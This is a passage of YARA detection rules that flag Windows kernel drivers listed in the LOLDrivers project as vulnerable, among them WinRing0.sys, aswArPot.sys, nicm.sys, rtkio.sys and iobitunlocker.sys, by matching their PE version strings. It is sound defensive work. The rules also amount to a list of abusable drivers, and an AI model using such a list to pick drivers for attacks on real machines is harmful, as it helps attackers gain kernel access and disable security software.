00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Mitactechnologycorporation_Vdbsvsys_Mitacsystemserviceprovider_91AF_RID4800 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VdBSv64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:25:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d0069005400410043002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900540041004300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320031002c00200031002c00200031002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320031002c00200031002c00200031002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0056006400420053007600360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d0069005400410043002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0056006400420053007600360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000370020004d006900540041004300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_00B3_RID369E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:03:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c00200043006c00690065006e007400200050006f00720074006100620069006c0069007400790020004c0061007900650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310032002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310032 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00490043004d002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310035002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_B50F_RID36B6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - libnicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:07:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c0020005800540043004f004d0020005300650072007600690063006500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e0036 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006c00690062006e00690063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000300038002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Openlibsysorg_Winringsys_Winring_11BD_RID3B55 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WinRing0.sys, WinRing0x64\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:24:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069006e00520069006e00670030 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004f00700065006e004c00690062005300790073002e006f00720067 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00570069006e00520069006e00670030002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e00520069006e00670030 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00570069006e00520069006e00670030002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300037002d00320030003000380020004f00700065006e004c00690062005300790073002e006f00720067002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowswinowsdriverkitsprovider_Hwrwdrvsys_Hardwarereadwritedriver_21CC_RID49E3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HwRwDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 06:45:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0048006100720064007700610072006500200072006500610064002000260020007700720069007400650020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f0077007300ae002000770069006e006f007700730020003700200064007200690076006500720020006b006900740073002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0035002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0035002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0048007700520077004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0048006100720064007700610072006500200072006500610064002000260020007700720069007400650020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0048007700520077004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpot_Avastantivirus_AD8F_RID3D84 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:57:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0036002e003100300037002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0036002e003100300037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300032003000200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_3124_RID36D6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:12:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c0069006200200066006f00720020004d00530049004600720065007100750065006e00630079005f00430043 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003000390020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Dcprotectsys_Dcprotectrwinxdriver_FF55_RID4594 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - DcProtect.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:41:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044006300500072006f00740065006300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0044006300500072006f00740065006300740020002800520029002000570069006e0038002e003100780038003600200064007200690076006500720020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032002d00320030003200300020004a00690061006e0067006d0065006e0020004500790075006e0020004e006500740077006f0072006b00200043006f002e002c004c00740064002e00200032003000310039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_A855_RID36AC : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nscm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:05:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c002000580054006900650072002000530065007300730069006f006e0020004d0061006e0061006700650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310031 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00730063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310034002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiosys_Realtekiodriver_DB71_RID3B2C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:17:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300034002e0030003100300035002e00320030003100360020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300034002e0030003100300035002e0032003000310036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f00200044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100360020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Iobit_Monitorsys_Advancedsystemcare_E4A7_RID3C67 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Monitor_win10_x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:10:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049004f006200690074002000540065006d007000650072006100740075007200650020004d006f006e00690074006f0072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049004f006200690074 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e00310031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310032002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004d006f006e00690074006f0072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041006400760061006e006300650064002000530079007300740065006d0043006100720065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004d006f006e00690074006f0072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a900200049004f006200690074002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Iobit_Iobitunlockersys_Iobitunlocker_2B33_RID3CC6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iobitunlocker.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:26:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049004f0062006900740055006e006c006f0063006b006500720020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049004f006200690074 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0049004f0062006900740055006e006c006f0063006b00650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049004f0062006900740055006e006c006f0063006b00650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0049004f0062006900740055006e006c006f0063006b00650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0049004f00620069007400200043006f0070007900720069006700680074002000a900200032003000300035002d0032003000310033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Phoenixtechnologiesltd_Phlashnt_Winphlash_65DB_RID3EE6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PhlashNT.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:56:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005300570069006e0046006c006100730068002000440072006900760065007200200066006f0072002000570069006e0064006f007700730020004e0054 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500068006f0065006e0069007800200054006500630068006e006f006c006f0067006900650073002c0020004c00740064002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e0031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00500048004c004100530048004e0054 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e00500068006c006100730068 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00500048004c004100530048004e0054002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]002800630029002000500068006f0065006e0069007800200054006500630068006e006f006c006f0067006900650073002c0020004c00740064002e00200032003000300030002d0032003000300033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Arthurliberman_Alsysiosys_Alsysio_7196_RID3BA0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ALSysIO64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:37:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004c0053007900730049004f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041007200740068007500720020004c0069006200650072006d0061006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0038002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004c0053007900730049004f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004c0053007900730049004f } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004c0053007900730049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300033002d003200300030003900200041007200740068007500720020004c0069006200650072006d0061006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevices_Aoddriversys_Amdoverdriveservicedriver_F4DC_RID465A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AODDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:14:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d00440020004f00760065007200440072006900760065002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034002e0032002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002e0032002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004f00440044007200690076006500720032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d00440020004f00760065007200440072006900760065002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004f00440044007200690076006500720032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020003200300031003200200041004d0044002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrddkprovider_Rtportsys_Windowsrddkprovider_8FE4_RID42B9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtport.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:40:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00470065006e006500720069006300200050006f0072007400200049002f004f00200066006f0072002000570069006e00360034 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300033002000440044004b00200033003700390030002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0030002e0032003100390035002e0031003700310031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0030002e0032003100390035002e0031003700310031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007200740070006f00720074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300033002000440044004b00200033003700390030002000700072006f00760069006400650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007200740070006f00720074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d006900630072006f0073006f0066007400200043006f00720070002e00200032003000300035 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Anticheatexpertcom_Acebase_Anticheatexpert_7326_RID3EE9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ACE-BASE.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:57:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100430045002d0042004100530045003600340020004e00540020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041004e0054004900430048004500410054004500580050004500520054002e0043004f004d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0032003200300032002e0036003200310037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100430045002d004200410053004500360034 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041006e00740069002d004300680065006100740020004500780070006500720074 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a900200041006e0074006900430068006500610074004500780070006500720074002e0063006f006d0020004c0069006d0069007400650064002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1900KB and all of them\n}\n\nrule 